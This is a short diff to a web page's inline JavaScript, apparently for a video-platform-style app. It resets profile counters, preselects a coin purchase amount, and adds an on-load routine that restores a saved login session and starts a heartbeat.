   document.getElementById('videos').innerText = '0 videos';
   document.getElementById('followers').innerText = '0 followers';
   document.getElementById('following').innerText = '0 following';
+
+  document.querySelectorAll('.amountItem').forEach(i => i.classList.remove('active'));
+  document.querySelector('.amountItem').classList.add('active');
+  selectedCoin = 30;
+  selectedPrice = "$0.31";
 }
+
+window.onload = async function(){
+  const savedUser = Storage.get("last_user");
+  const token = Storage.get("token");
+  if(savedUser && token){
+    document.getElementById("login_user").value = savedUser;
+    const authOk = await checkUserAuth(savedUser);
+    if(authOk){
+      currentUsername = savedUser;
+      document.getElementById("loginBox").style.display = "none";
+      document.getElementById("app").style.display = "block";
+      setTimeout(()=>{
+        startHeartbeat();
+      },1000);
+    }
+  }
+};
 </script>
 </body>
 </html>
